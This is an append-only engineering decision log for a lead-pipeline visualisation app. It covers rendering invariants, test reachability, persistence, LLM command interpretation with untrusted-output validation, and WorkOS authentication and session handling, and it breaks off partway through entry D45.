# Decision Log

Numbered, append-only. Each entry: what was decided, why, and what it forbids.
Longer rationale usually lives as a comment at the decision's code site;
this file is the index an external reviewer can trust.

## D1 — Score is the only mover; `ingest()` is the only mutator
The store exposes no `setScore`/`moveLead`; the 3D layer re-derives position
from score every frame and holds no state. Forbids: tween systems, decorative
movement, arbitrary-timer progression (spec §27.3). This is the project's
load-bearing invariant.

## D2 — Radius from stage index, not raw score
Score bands are uneven (cold spans 20 points, booked 1). Equal annulus per
stage keeps every stage legible; within-stage progress shows as drift.

## D3 — Engagement asymptotes below booked (`TOUCH_CEILING` = 98)
No volume of replies can reach periapsis; only `appointment_booked` crosses
into the booked band. The centre means a booking or it means nothing.

## D4 — Negative movement is real
Objections/cancellations/going-cold push outward; idle decay after a 72h
grace. A one-way universe is a progress bar, not a pipeline.

## D5 — Agent work is a task with a lifetime and a claim
Outbound events come from `AgentTask`s that occupy an agent and claim the
lead (no double-working); inbound events land immediately. Arcs in the field
are those tasks, one-to-one.

## D6 — Command parser is a grammar that reports its leftovers
Unparsed words come back as `ignored:` chips; recognised spans are blanked as
consumed; recency parses before stages ("haven't been contacted in 14 days"
contains a stage word). Swapping in an LLM = replacing `parseCommand`, same
`LeadQuery` contract. Forbids: silently dropping clauses.

## D7 — The funnel is the answer
Every query reports per-clause survivor counts. Makes contradictory queries
self-explaining (`376 qualified → 0 score > 80`).

## D8 — Canvas is `aria-hidden`; information parity lives in DOM
`LeadList` is the Universe as a listbox; announcements on slow cadence; any
new visual information must also land in DOM. Forbids: ARIA bolted onto
canvas; DOM-less features.

## D9 — Orchestrator honesty is structural (spec §37)
Capability profiles never assert availability; reachability only from the
host descriptor; routing log entries start `execution:'pending'` until
`confirmExecution()`. Absent descriptor → ASSISTED and blocked, no invented
plan. Forbids: hardcoded model availability, claiming unexecuted routing.

## D10 — One shared `stableHash` with an avalanche finalizer
FNV-1a + murmur3 finalizer, shared by appointments and channel routing (both
read high bits). Fixed real distribution bugs; shared so a fix cannot fork.

## D11 — Stage bands tile the reals, `[lo, hi)`
Integer-inclusive bands left score 20.5 stageless and made radius
non-monotonic. Guarded by a 0.25-step test.

## D12 — The rail scrolls; every list owns a bounded band (2026-09-15)
`overflow:hidden` around nine panels silently amputated five of them,
including the accessible lead list — while every automated check stayed
green. Lesson recorded in `SELF-CRITIQUE.md`: **rendered is not reachable**;
UI work needs geometry+click verification in a real browser.

## D13 — The book is national and population-weighted (2026-09-15)
~90 metros, 50 states + DC, sampled by metro population; area codes belong to
their metro. A single-state book made the §15 drill's first level a no-op.
Guarded by tests: 4 regions present, >40 states, largest state >5× median,
one area code per metro.

## D14 — Geography parsing: uppercase-only state codes, longest-first cities
(2026-09-15) `ME/OR/IN/OK/HI/DE` are English words — case-insensitive
matching turns "find me leads" into a Maine filter. City scan longest-first
so "Kansas City" survives. Tests assert the *absence* of matches (the
direction that fails silently). Ambiguity rule: bare city name matches every
state using it (both Charlestons); "Washington" is the DC metro, `WA` the state.

## D15 — Core shader: dithered march, fixed noise frequency, periodic phases
(2026-09-15) Three glitch causes fixed structurally: (a) per-pixel IGN stagger
on the march start — undersampling banding becomes static grain; (b) noise
frequency decoupled from the breathing radius — the breath moves the
silhouette, never the pattern; (c) time arrives as wrapped phases over a
lattice with integer lacunarity and per-corner mod — seamless to float32
rounding (max seam delta 3.6e-6), so uptime cannot degrade it.
Also recorded: the original "hash precision" diagnosis was **disproven by
float32 emulation** before fixing — measure first, even when the story sounds
right. Forbids: raw elapsed seconds entering shader noise domains.

## D16 — Cluster chips scroll, never truncate (2026-09-15)
"…and N more" hid the very states a user drills for. Same class of failure
as D12.

## D17 — Docs-in-repo protocol (2026-09-15)
`/docs` is the canonical handoff surface; `CURRENT_STATE.md` and
`NEXT_ACTIONS.md` must be updated after every meaningful phase so an external
AI can resume without local conversation history. See
`AI_DEVELOPMENT_PROTOCOL.md`.

## D18 — Aggregate-then-assert for whole-book property tests (2026-09-15)
A 49k-`expect()` loop timed out under machine contention while the property
itself takes milliseconds. Whole-book invariants collect violations in plain
code and assert once (first 5 shown).

## D19 — GitHub over SSH; stub history merged, not overwritten (2026-09-15)
Two choices worth not re-litigating. **(a) SSH, not HTTPS.** The only git on
this machine is a standalone `dugite` build (no CLT, no system git, no `gh`),
and it ships **no CA bundle** and no `osxkeychain` credential helper — its own
shim comments flag HTTPS pushing as untested. An ed25519 key with the host
fingerprint pinned sidesteps both the trust store and credential storage. A
token would have needed `credential.helper store`, i.e. plaintext on disk, for
no gain. **(b) Merged, not force-pushed.** The remote already held 3 stub
commits (one-line `README.md`, two typo fixes of the project name). The stub
was read first, confirmed superseded by the repo's real 23KB README, and the
histories joined with `--allow-unrelated-histories`, resolving add/add in
favour of ours. Force-push would have lost nothing of value, but discarding
someone else's published commits is the owner's call, not the agent's, and the
merge is verified inert: `git diff cc8ca0b HEAD` is empty. Forbids: rewriting
published history on `main` without explicit owner instruction.

## D20 — Reachability is proven with real input events, never programmatic
(2026-09-15) `e2e/reachability.spec.ts` establishes that a panel is reachable
by pointing at the rail and sending **wheel events**, then hit-testing with
`elementFromPoint` and issuing a real click. It deliberately does *not* use
`scrollIntoView()` or lean on Playwright's auto-scroll-before-click, because
**an `overflow: hidden` element is still programmatically scrollable** — both
of those move it happily, so a suite built on either would have passed while
the D12 rail was broken. That is the exact bug the file exists to catch, so
the cheap way to write it is the way that makes it worthless.
Proven, not assumed: reverting `.rail` to `overflow: hidden` turns 6 of 8
tests red, naming Leads/Orchestrator/Activity-feed as unreachable with
`afterWheelTicks=1` (the loop's no-movement bail-out). Restored after.
Forbids: asserting reachability through any API a user does not have.
Also fixed here: `e2e/**` is excluded from vitest in `vite.config.ts`. Its
default globs claim `**/*.spec.ts`, so without that line `npx vitest run` —
the command the protocol and `project-state.json` both name — tries to open a
Playwright file and fails. Two runners, two directories, no overlap.

## D21 — Reachability asserts the click point, not the whole box (2026-09-15)
D20's suite required an element's ENTIRE bounding box inside the viewport. That
is stricter than the question the suite exists to ask, and it made the verdict
depend on font metrics: on the CI runner's Linux fonts the last rail panel's
heading landed at `top=991 bottom=1002` against a 1000px viewport — two pixels
of an eleven-pixel heading outside — while `elementFromPoint` at its centre
resolved to the heading itself and a real click landed. The test failed an
element a user can see and click, and flipped colour by a pixel depending on
platform. CI was red from round 5; round 6 passed by luck.
**Verified first that this was a TEST defect, not a layout one**: at maximum
scroll the last panel sits fully inside the rail at 1280x800, 1600x1000 and
2560x1440, with the rail's 14px bottom padding to spare. No product or layout
change was made, and none was warranted.
The invariant is now semantic: **the point a click would be delivered to must be
on screen, and hit-testing there must resolve to the target.** No tolerance
value was introduced — this is a different question, not a loosened one.
`fullyInViewport` is still computed and still printed in failure messages, and
is still ASSERTED for the command bar, which sits in the main stage rather than
a scroll container: clipping there would be a real regression.
Proven, not assumed: reverting `.rail` to `overflow: hidden` still turns 6 of 8
tests red, reporting `reachable=false receivesPointer=false hitAt centre=null`
with `top=1364 bottom=1392` against a 1000px viewport. Restored afterwards and
confirmed byte-identical to origin/main.
Forbids: asserting pixel-perfect containment as a proxy for reachability.

## D22 — Two sources, one seam; `ingest` stays the only door (2026-09-16)
Arc A. `LeadSource { name, start, stop }` is now explicit, and `ReplaySource`
joins the simulator behind it. A source produces `LeadEvent`s and hands them to
`ingest`; it may not touch the store, and it knows nothing of zustand, React or
Three.js. Selection lives in `src/state/sources.ts` (`?source=replay`), and a
typo falls back to the simulator rather than leaving the app with no feed.
Recording observes the store's feed instead of wrapping `ingest`, so it captures
events from every route (inbound, and agent tasks resolving through
`completeTask`) without adding a second thing that can mutate state.
The format is versioned, offsets are relative (so a session replays at any time
and speed) while `event.at` stays absolute because appointments are scheduled
from it, and `parseSession` **throws rather than dropping malformed entries** —
a replay that silently skipped events would produce a plausible run that does
not match the recording, which is worse than a loud failure.
Recorded explicitly as a limitation rather than discovered later: replay does
not recreate in-flight `AgentTask` arcs, because tasks are transport-side
simulation, not domain events. Attribution survives via each event's `agentId`.
Forbids: any incoming-event path that reaches state without going through
`ingest`.

## D23 — Persistence restores by replaying events, never by writing state
(2026-09-16) Persistence v1. The saved record is a durable copy of the canonical
event log, not an alternate authoritative store: restoring means replaying it
through the same `ingest` a live source uses, so D1 (one mutator) survives
intact and there is no second way for state to change.
This is only sound because `seedLeads` derives score, stage, theta and
inclination from a pure `rng(seed)` stream — a fresh book is reproducible, and
`applyEvent` depends on nothing but the prior score and the kind. The same log
against a *different* book would land on different leads, so `{seed, leadCount}`
is recorded and checked; a mismatch refuses to apply and keeps the log.
IndexedDB over localStorage: ~9 events/sec is several MB an hour, and
localStorage is synchronous on the main thread, which seven rounds of
performance work went into keeping clear.
Boot is a singleton promise — restore, then record, then start a source.
Two failures it prevents: a source starting mid-hydration interleaves live
events with restored history and records the mixture; and StrictMode's
double-invoked effects would hydrate the log twice.
At `MAX_PERSISTED_EVENTS` the log is SEALED, not trimmed: a sealed log is a
correct *prefix* of the session, while dropping the oldest events would restore
a state the session never passed through.
Corruption policy: unknown version, malformed record or any invalid event ⇒
discard, clear, start fresh, report. Never partially apply — a half-restored
history is a believable session that never happened.
Recorded because it was found the hard way: the write scheduler must be a
trailing THROTTLE, not a debounce. A debounce that restarts on every event never
fires while events keep arriving, and at ~9/sec it silently persisted nothing
with no error raised. Forbids: debouncing a write against a continuous stream.

## D24 — New lead fields hash the id; they never consume the seed stream
(2026-09-16) §15. `campaign` and `acquisitionSource` are canonical `Lead` fields
derived from `stableHash(id + salt)`, not from the `rng(seed)` stream inside
`seedLeads`.
The reason is compatibility, and it is not a detail: the seeding loop draws in
sequence, so consuming one extra `rand()` shifts every lead after it — different
scores, names, metros and angles across the whole book. A persisted event log or
a replay session replayed onto that book would land on *different leads* while
appearing to work perfectly. Hashing the id sidesteps it entirely: every
pre-existing seeded value is byte-identical, so Persistence v1 needs no format
bump and no migration, and the Arc A fixture is unaffected. A pinned-score test
guards the property.
Distinct salts per field keep the distributions independent.
Naming: the field is `acquisitionSource`, NEVER `source` — `LeadSource` is the
runtime transport and the collision would be permanent.
Agent grouping reads `lead.ownerAgentId`, which `ingest` sets from event
attribution. Unworked leads are reported as Unassigned, never dropped: on a cold
book that is the entire book, and one truthful cluster beats a fabricated
spread.
Forbids: adding a seeded lead field by drawing from `rand()` inside the seeding
loop without an explicit book-schema version bump.

## D25 — A control must not move because you pointed at it
(2026-09-16) `LeadDetail` grows from a 79px placeholder to a ~389px record the
moment it has a lead to show, and it sits ABOVE the Leads list in the rail.
Previewing a lead hovered in that list therefore pushed the very row under the
pointer ~310px down, and the click that followed landed on bare rail. So
`hover()` now carries a `HoverSource`, and the detail panel previews only
`'field'` hovers: the pointer is over the canvas there, so resizing a rail panel
moves nothing underneath it. A `'list'` hover still lights the lead in the field
and marks its row — it just does not reflow the rail above itself.
Found because a test failed for the right reason. `spatial-focus.spec.ts` went
red at 2560x1440 ONLY, and the missing card was not the defect — nothing was
ever selected. That viewport was where the rail's content exactly fitted
(scrollHeight === clientHeight), so there was no scroll slack to absorb the
shift; the other three viewports were already scrolled and silently got away
with it. The bug was in the initial commit and had been live the whole time, at
every viewport, for every human who moved a mouse onto a row.
The suite had been budgeting for it rather than catching it: `wheelIntoView`
carries a three-stall tolerance whose own comment names "LeadDetail fills on
hover" as a reason the rail moves under it.
Nothing is lost by scoping the fallback: a row already shows name, stage and
score, and its accessible name carries segment and location. The field is the
surface with nothing readable on it, which is what the fallback was always for.
Third instalment of D12's lesson, after D21: rendered is not reachable, and
**visible must mean operable** — including one frame from now.
Forbids: resizing any rail panel as a consequence of hovering something below
it. Forbids asserting reachability through `locator.click()` alone, which
re-resolves and re-scrolls before it clicks; a human gets no such compensation,
so the regression test moves and clicks at one fixed point.

## D26 — Reachability assertions name a lead, never a row index
(2026-09-16) The roster is ordered by score and rebuilt as events land (~9/s
under the live feed), so `getByRole('option').first()` names a different lead
from one moment to the next. The reachability test read a name off `.first()`,
clicked `.first()`, then asserted `.first()` was selected — three reads of a
moving target — and failed with the row it had actually clicked sitting there
correctly selected, because a warmer lead had taken index 0 in between.
Identity and name are now captured in ONE evaluation and every later assertion
addresses the row by its `id`. Positional locators are for tests about ORDER;
using one anywhere else is asserting about a list's sort order by accident.
Forbids: `nth()`/`first()` as an identity in any assertion that spans a click on
live data. The same reading retired `nth(1)` in `spatial-focus.spec.ts`, which
progressive reveal had turned into a positional claim about a one-member
cluster.

## D27 — Apsis holds no model credential, and never asks a model who anyone is
(2026-09-16) Opt-in LLM command parsing. Apsis is a browser-only SPA with no
server, so any API key it can reach is public: `VITE_*` values are inlined into
the bundle at build time and `import.meta.env` is readable in devtools. A key
shipped to the browser is compromised the moment it is built.
So the boundary is: Apsis holds no vendor credential and calls no vendor API. It
POSTs `{ text, schema }` to an endpoint the HOST declares via
`window.__APSIS_COMMAND_INTERPRETER__`, mirroring §37's `__APSIS_MODEL_ENV__` —
the environment states what is reachable, and the default is "nothing is". The
host owns the key, the rate limiting and the abuse problem, and the vendor stays
swappable because nothing in `src/` knows which model answered. No SDK: `fetch`
and nothing else, so there is no dependency that could acquire a key later.
What leaves the browser is the user's own sentence plus the closed vocabularies
(stages, segments, city and state names) — schema, not records. Never a lead,
name, phone, email, score, intent or event. The model is a language interpreter,
not a lead database: parsing "hot leads in Florida" needs to know that `hot` and
`FL` exist, not who they are. Asserted against a 500-lead seeded book rather
than promised.
Forbids: an API key in client-visible source, a direct vendor call from the
browser, an LLM SDK in `package.json`, and any request body built from store
state.

## D28 — Nothing is applied that the model cannot point at
(2026-09-16) Every filter an interpreter returns must cite a `span` that appears
verbatim in the user's input, and a citation that is not there kills the filter.
The same rule governs the ACTION — `actionSpan` is required to apply a non-`none`
action, which extends the contract's envelope by one optional field.
That extension is deliberate and it is the difference between honest and nearly
honest. `unrecognised` is computed by SUBTRACTING accepted spans from the input,
exactly as `parseCommand` computes it, so a clause the model dropped cannot
disappear. Without a span for the action, "call them" would either be reported
as ignored while agents were being dispatched, or be exempted from the residue
and quietly trusted. Requiring the citation makes one rule cover everything:
no provenance, no effect.
The model's own `unmapped` list is validated for shape and then NOT rendered.
The residue already guarantees nothing vanishes, and it is built from the user's
words — merging model-authored free text into the outcome panel would let the
interpreter write Apsis's UI copy for no gain in honesty.
Stop words are not duplicated from `query.ts` (forbidden to this milestone and
private anyway). The grammar is asked instead: a residue word is filler only if
`parseCommand` neither recognises nor reports it. A word the domain KNOWS but
the interpreter skipped — "tampa" — is therefore still surfaced, which is
precisely the failure worth seeing.
Forbids: trusting a model's account of what it understood; applying any clause
without verifiable provenance; duplicating the grammar's stop-word list.

## D29 — The endpoint is not a trusted component
(2026-09-16) Apsis's first server-side code: `POST /api/interpret`, same origin,
a plain `Request -> Response` in `server/` with a three-line platform adapter in
`api/`. Anthropic over `fetch` with forced tool use; no SDK on the server
either, so D27 stands unamended and no dependency ever sits between Apsis and a
credential. Default `claude-haiku-4-5-20251001`, escalated by `APSIS_MODEL`
alone.
The shape follows from one fact: the client shipped first and does not need
this. Forced tool use narrows what a model can say, but a schema-shaped lie —
real field, plausible value, a span nobody typed — is still expressible, so the
browser validator stays authoritative and the server trims for size and shape
rather than re-deciding truth. Two validators meant to agree eventually
disagree, and the browser's is the one governing what reaches `LeadQuery`.
The acceptance criterion that proves it: `src/**` unchanged and
`e2e/llm-command.spec.ts` passing UNMODIFIED, including its zero-network case.
Forbids: moving semantic validation into the server; any handler branch that can
throw out of the top (an unhandled error becomes a platform 500 with an
unpredictable body, so there is a floor under it); retries.

## D30 — The client's schema is data about the client, never an instruction
(2026-09-16) The browser posts `{ text, schema }` and the server **ignores
`schema` entirely**, building its prompt from its own pinned import of
`COMMAND_SCHEMA`. That is the schema-injection answer: a client-supplied
vocabulary is an instruction from an untrusted party, and accepting one would
let anybody rewrite what Apsis asks the model — or inflate the payload for cost.
Importing the same object the browser validator enforces means the list the
model is told about and the list its answer is judged against cannot drift.
Unknown top-level keys are rejected rather than ignored, so a client that starts
sending more than agreed is noticed instead of absorbed.
Both directions are untrusted: browser input (method, origin, content-type,
8 KB streamed cap, 512-character text, shape) and model output (tool call
required, 32 filters max, spans clipped). The size cap streams and counts rather
than buffering and measuring, because reading an 8 MB body and rejecting it
afterwards is not a limit.
Forbids: reading any field of the client's `schema`; parsing a body before
capping it; returning a vendor message, prompt, stack or key to the browser.

## D31 — Command text is PII, and rate limiting is not authentication
(2026-09-16) Two things this milestone refuses to pretend.
**Logging.** Command text is never logged by default: a user types "find the
Moreau lead" and a command log becomes a PII log wearing a different hat.
Prompts, model output and envelopes are equally absent — an envelope carries
spans, which are verbatim fragments of the command. Logs carry timestamp,
request id, outcome code, latencies, token counts, model id and an error class.
**Abuse.** The endpoint is unauthenticated and backed by a metered vendor key,
so anyone who can reach it can spend it. Same-origin checks, size caps and the
per-IP token bucket are COST CONTROL and friction; on serverless the bucket is
per-instance, so the real ceiling is roughly instances × limit. The layers that
enforce are the platform's rate limiter and a vendor spend cap. This is written
into the README, not just here, because a reader deciding whether to deploy is
the person who needs it.
Forbids: describing the limiter as access control; enabling text logging in
production; a public deployment before authentication lands.

## D32 — Send no sampling parameters, on any model
(2026-09-16) The provider sent `temperature: 0` for determinism. Claude Sonnet 5
— the documented `APSIS_MODEL` escalation path — returns a **400** when
`temperature`, `top_p` or `top_k` is set to a non-default value (verified at
platform.claude.com/docs/en/models/sonnet-5/overview). So the escalation path
was a one-variable outage: flip the env var and every command becomes a 502 and
every user is silently demoted to the grammar.
The fix is to send none of them, and the reason it is not a per-model capability
table is that a table has to be updated for every future model, fails closed
only if someone remembers, and fails as a production 400 rather than a red test.
Sending nothing is valid everywhere — each model uses its own default — so there
is no decision left to get wrong. What `temperature: 0` was buying is already
bought structurally: forced tool use fixes the shape, the enum fixes the field
names, and the browser validator fixes what may reach `LeadQuery`. Identical
paraphrase mapping was never a guarantee this design relied on.
Related, and documented rather than defended against: forced tool use
(`tool_choice: {type:'tool'}`) returns 400 on Claude Fable 5.1 and Mythos 5.1,
and on manual extended thinking. Adaptive-thinking models (Sonnet 5, Opus 5)
accept it. `APSIS_MODEL` is free text, so that is a real deployment footgun and
it belongs in the README next to the variable.
Forbids: sending `temperature`, `top_p` or `top_k`; branching the request on
model id.

## D33 — Cancellation that is not enabled is cancellation that does not exist
(2026-09-16) The handler aborts the provider call when the browser hangs up, so
an abandoned command stops costing money. On Vercel that is opt-in **per path**:
without `"supportsCancellation": true` under `functions` in `vercel.json`,
`request.signal` never fires, the handler still looks correct, and every
abandoned request runs to completion and is billed.
Nothing in the source could reveal that, which is the whole problem — so the
configuration is asserted by a test that also walks `api/` and requires an entry
for EVERY function, because adding a second endpoint without cancellation is the
realistic way this regresses. The adapter is asserted to stay under eight lines
for the same reason: logic that migrates into the platform file stops being
covered by `server/*.test.ts` and stops running locally.
Forbids: a function in `api/` with no `supportsCancellation` entry; logic in the
platform adapter.

## D34 — Cleanup that runs after the push can never fire
(2026-09-16) The rate limiter's bucket cleanup read
`if (perHour.length === 0) hour.delete(key)` immediately AFTER pushing the
current timestamp, so the length was structurally never zero and the branch was
dead. Every IP an instance had ever seen was retained for the life of that
instance, and nothing exposed the table's size, so no test could have noticed.
Replaced with one map per identity (two maps let a key survive in one after
being dropped from the other) and an amortised sweep every five minutes: the
keys that leak are exactly the ones that stopped calling, so only a periodic
pass can reclaim them, and a per-request full scan would put O(all keys) on the
hot path. `RateLimiter` now exposes `size()`, which is what makes reclamation
testable at all.
The honest scope is unchanged: serverless instances do not share memory, so the
real ceiling is roughly instances × limit. This is cost control, not
authentication (D31).
Forbids: cleanup predicated on state the surrounding code has just made
impossible; an unbounded identity table; an O(all keys) sweep per request.

## D35 — A stall count cannot measure "cannot scroll" in a living document
(2026-09-16) `wheelIntoView` treated three consecutive no-movement wheel ticks
as "cannot scroll farther". The rail is a LIVING document — the activity feed
gains rows, appointments land — so that conflated two different states and the
wrong one kept happening: the rail sat at its current maximum when a tick fired,
the helper banked a stall, the feed added a row, `scrollHeight` grew, and by the
time the target was reachable the helper had already given up. One observed
failure had the last panel at `top=1028` in a 1000px viewport with
`afterWheelTicks=3`. Raising the count would only have made the race rarer,
which is the tell that the count was never the right question.
The fix asks what the count was a proxy for. A tick that moves nothing has
exactly two explanations, and they are distinguishable by looking at the scroll
extent: NOT at the end of travel means there is room and the wheel could not use
it — the D12 regression, now caught on the FIRST tick instead of the third, so
the check got STRICTER. At the end of travel means the only open question is
whether this bottom is final, which is answered by waiting for `scrollHeight` to
settle: grew ⇒ keep wheeling, held still ⇒ genuinely unreachable.
The settle is a bounded predicate, not a sleep: it returns as soon as three
consecutive 50ms samples agree (~150ms typical) and gives up after ~600ms,
capped at five settles per call.
Proven both ways, not argued: reverting `.rail` to `overflow: hidden` turns 7 of
11 red across all three viewports in 31 seconds, and the previously flaky
viewport ran 12 consecutive times clean. `src/App.css` restored byte-identical
afterwards.
No assertion was weakened — the caller still requires the click point on screen,
the hit test to resolve to the target, and a real click to land.
Forbids: counting stalls, raising a stall threshold, or adding a sleep, to
paper over a container whose size is still changing.

## D36 — Identity is derived, never received
(2026-09-16) Authentication contract. The server reads `userId`,
`organizationId`, roles and capabilities from ONE place: Apsis's own sealed
session cookie, decrypted with a server-only key. A header, query parameter or
body field carrying any of them is ignored — not rejected with a helpful
message, ignored — and a test asserts forged values change nothing.
Capabilities are derived server-side by `capabilitiesFor(claims)` and never
stored in the cookie as a grant the browser could influence. Authorization is
one question at every endpoint — `can(identity, capability)` — so roles enter in
one function rather than at every call site, and no endpoint ever learns what a
role is. v1 has exactly one capability, `interpreter:use`, because there is
nothing yet to differentiate; the seam is the point, not the matrix.
Forbids: trusting any browser-supplied identity claim; branching on roles inside
an endpoint; storing an email in the session.

## D37 — Authenticate before reading the body
(2026-09-16) The protected pipeline is: method → origin → content-type → IP
limit → authenticate → authorize → per-user limit → body cap → parse →
provider. Two placements are load-bearing. The **IP limit precedes
authentication**, so an unauthenticated flood is refused without decrypt work
and session guessing is throttled. **Authentication precedes reading the body**,
so an unauthenticated request is rejected before its payload is even received —
which makes "unauthenticated requests never reach the provider" a structural
property rather than something to be checked at the end.
The IP backstop is kept, not replaced: it is the only limiter that works before
identity exists, and removing it would leave the cheapest attack the least
limited. Per-user limiting is added on top because users share IPs behind office
NAT and one user roams across many. Both remain cost control, not quotas —
durable counters are one of only two things that would justify a database, the
other being instant revocation.
Forbids: reading a request body before authentication on a protected endpoint;
removing the IP tier; treating a 429 as an auth signal.

## D38 — A development bypass must be absent, not disabled
(2026-09-16) The dev identity lives in `scripts/devIdentity.mjs`, outside
`server/`, imported only by `scripts/dev-interpreter.mjs` and injected through
the `authenticate` option the handler already accepts. `api/interpret.ts`
imports nothing from `scripts/`, so the deployed bundle does not contain the
code at all — there is no flag to set, no variable to misconfigure and no
`?auth=off`. An import-graph test asserts `scripts/` is unreachable from the
production entry point.
An environment check is not structural: it fails open if a variable is set
wrongly, and the code is still there to be reached. Absence is the only version
of this that cannot be misconfigured.
Related: v1 gates the INTERPRETER, not the application. Gating the whole app
would protect nothing that needs protecting — the lead book is seeded
client-side with no real customer data — while breaking the "no credential
needed to work on Apsis" promise and putting a wall in front of a demo whose
value is being immediately visible. **The trigger for changing that is explicit:
the moment any real customer data is served from the server, the app-wide gate
becomes mandatory.**
Forbids: a query parameter or environment variable that disables authentication;
shipping dev-auth code in a production artifact.


## D39 — Use the provider's session primitives; write no session cryptography
(2026-09-16) **Supersedes the sealed-session part of the original auth
contract.** That draft had Apsis implement its own AES-256-GCM seal containing
the WorkOS refresh token. Withdrawn: sealing, JWT validation against a rotating
JWKS, refresh rotation and replay grace are exactly the category where a vetted
provider implementation beats custom crypto written once and reviewed by nobody.
Dependency aversion is a good instinct that becomes a bad one precisely here.
`@workos-inc/node` pinned `^10.13.0`, server-side, authentication only. It has
**zero runtime and zero peer dependencies** and `engines: node >=22.11.0`, which
matches the runtime the endpoint already targets — so it drags in no supply
chain and no version conflict.
**D27 is unchanged, not relaxed.** That invariant is about model integration and
browser credentials: Anthropic stays `fetch`-only with no SDK, there is no
browser auth SDK, and no WorkOS key, token or cookie password exists
client-side. The new rule is narrow: WorkOS may be imported by
`server/auth/provider.ts` and its tests and NOWHERE else — not by
`server/interpret.ts`, not by `api/**`, not by `src/**` — so `/api/interpret`
depends only on the generic `authenticate`/`Identity` seam and swapping
providers touches one file. An import scan enforces it, because a boundary
nobody checks is a boundary that moves.
Apsis still owns the cookie and its attributes, when authentication is required,
how `Identity` is derived, what capabilities exist, and the status semantics.
Using the SDK is not surrendering the boundary; it is declining to hand-roll the
one part that is genuinely hard.
API names were read from the published type definitions rather than prose — the
docs page renders the logout helper as `getLogOutUrl` while the shipped types
say `getLogoutUrl`. Verify against types, not documentation.
Forbids: hand-written session sealing or JWT verification; importing WorkOS
outside `server/auth/provider.ts`; any auth SDK, key or token in the browser.

## D40 — A transient provider failure is not a logout
(2026-09-16) The original contract claimed concurrent refreshes make the loser's
token fail and force another refresh. That was wrong. WorkOS rotates refresh
tokens with a **replay grace period**, so overlapping refreshes do not
invalidate each other — which means Apsis must NOT build a refresh mutex or
cross-tab coordination.
More importantly, the SDK distinguishes two failure classes in its own types:
`RefreshSessionTerminalFailedResponse { retryable: false }` for
`invalid_grant`, `mfa_enrollment`, `sso_required`, `invalid_session_cookie`,
`no_session_cookie_provided`; and `RefreshSessionRetryableFailedResponse
{ retryable: true, retryAfter? }` for `rate_limit_exceeded`, `timeout`,
`server_error`, `network_error`.
**Binding fail-safe: `retryable: true` must never sign a user out.** The cookie
is left untouched and the request answers **503 with `Retry-After`**, never 401.
Treating a WorkOS timeout or 429 as "your session ended" would log out every
signed-in user at once during an outage — an availability incident converted
into a credential incident. Only `retryable: false` clears the cookie and yields
401.
A successful refresh returns a new `sealedSession` which MUST be written back as
the cookie; dropping it silently loses the rotated token and the next refresh
fails terminally.
Forbids: mapping any retryable refresh failure to 401; discarding a rotated
sealed session; adding a refresh mutex.

## D41 — Authentication fails closed, and the dev identity is injected from outside
(2026-09-16) Authentication implemented. Three properties are structural rather
than conventional, and each has a test that would fail if someone undid it.
**Fails closed.** `createInterpretHandler` takes `authenticate` exactly as it
takes a model provider, and `null` — the unconfigured case — refuses every
protected request with a 401. An auth layer that evaporates when misconfigured
is not an auth layer, and "closed" is the only default where a deployment
mistake is visible instead of silent.
**The dev identity is injected, never imported.** `scripts/devIdentity.mjs`
lives outside `server/` and is passed in by `scripts/dev-interpreter.mjs`. The
import graph from every `api/` entry point is walked by a test and must never
reach `scripts/`, so the bypass is absent from the deployed artifact rather than
disabled in it. A companion test forbids the strings `auth=off`, `AUTH_DISABLED`,
`SKIP_AUTH` and their relatives anywhere in `server/` or `api/` — the point is
that there is no switch, not that the switch is off.
**Every response leaves through one function.** `withCookie` wraps all of them,
because a rotated `sealedSession` dropped on an error path is a refresh token
lost and a silent logout an hour later. Tests assert the rotated cookie survives
a 200, a 403 and a 400.
Two smaller findings, both caught by existing tests rather than by inspection:
the D33 "every api/ function has supportsCancellation" test fired the moment the
auth adapters landed, and had to learn Vercel's documented rule that
underscore-prefixed files are not functions; and the D27 dependency pin fired on
`@workos-inc/node`, which is now allowed by name while the LLM-SDK pattern match
stays exactly as strict.
Forbids: defaulting authentication to permissive when unconfigured; importing
the dev identity from `server/` or `api/`; returning a response that bypasses
`withCookie`.

## D42 — Logout is a POST; a state-changing GET is a CSRF hole
(2026-09-16) Review found the sign-out affordance rendered as
`<a href="/api/auth/logout">` and the provider not checking the method. A GET
that clears a session and calls the provider can be fired by any `<img src>` on
any page — and `SameSite=Lax` DELIBERATELY attaches cookies to cross-site
top-level GETs, so the one CSRF layer people assume covers this does not.
Now: a wrong method changes nothing and returns 405 with `Allow: POST`; the POST
path enforces the same origin policy the interpreter uses, through the same
`sameOrigin()` function rather than a second copy that could drift; and the
browser control is a real `<form method="post">` with a submit button, so it
stays keyboard-operable and reachable by assistive technology while no longer
being a link. Cookies are cleared and the provider is called on the valid flow
only, asserted for every rejected method and every cross-site header shape.
Forbids: any endpoint that mutates on GET; a second implementation of the
same-origin check.

## D43 — A rotated session must be persisted on EVERY route that can rotate it
(2026-09-16) `/api/interpret` wrote back a rotated `sealedSession`;
`/api/session` did not. Since `authenticate()` may refresh and rotate on the way
through, the status route could consume a rotation at WorkOS and then discard
the new cookie — leaving the browser holding a superseded token. The user is
signed out minutes later, somewhere else, for no reason they could observe. The
worst kind of bug: correct-looking, silent, and separated in time from its cause.
The fix is not "remember to do this" — it is that `sessionResponse` carries
`setCookie` the same way the endpoint's single `withCookie()` exit does, with a
test that fails specifically if it is dropped.
Forbids: any route that calls `authenticate()` and discards `setCookie`.

## D44 — "We could not check" is not "you are signed out"
(2026-09-16) Three places collapsed a transient condition into a logout, and
each would have turned a WorkOS blip into a mass sign-out:
`sessionResponse` mapped every non-authenticated result to
`{ authenticated: false }`, including `transient` — now 503 with `Retry-After`,
cookie kept, and it never says `authenticated: false`.
`authenticate()` treated ANY throw as `expired` — but the SDK reports everything
it can classify as a typed `authenticated: false`, so a throw is verification
that could not be COMPLETED (a JWKS fetch failing, say). It is now `transient`.
No error parsing: guessing at SDK internals would be a second, worse classifier.
The client mapped 401 and 403 to the same "sign in" note — semantically wrong,
because a 403 user IS signed in and sending them to a sign-in page loops without
fixing anything. Now 401 → signed out, 403 → "not available for this account"
with the signed-in UI preserved, 503 → keeps the last known state. On first load
a 503 or an unreachable status endpoint renders a restrained "temporarily
unavailable", never a sign-in invitation.
Forbids: mapping a transient or unknown failure to signed-out anywhere; telling
a 403 user to sign in.

## D45 — The login challenge is not sealed, on purpose
(2026-09-16) The contract said the PKCE `state` + `codeVerifier` challenge was
sealed; the implementation stores URL-encoded JSON in an HttpOnly, Secure,
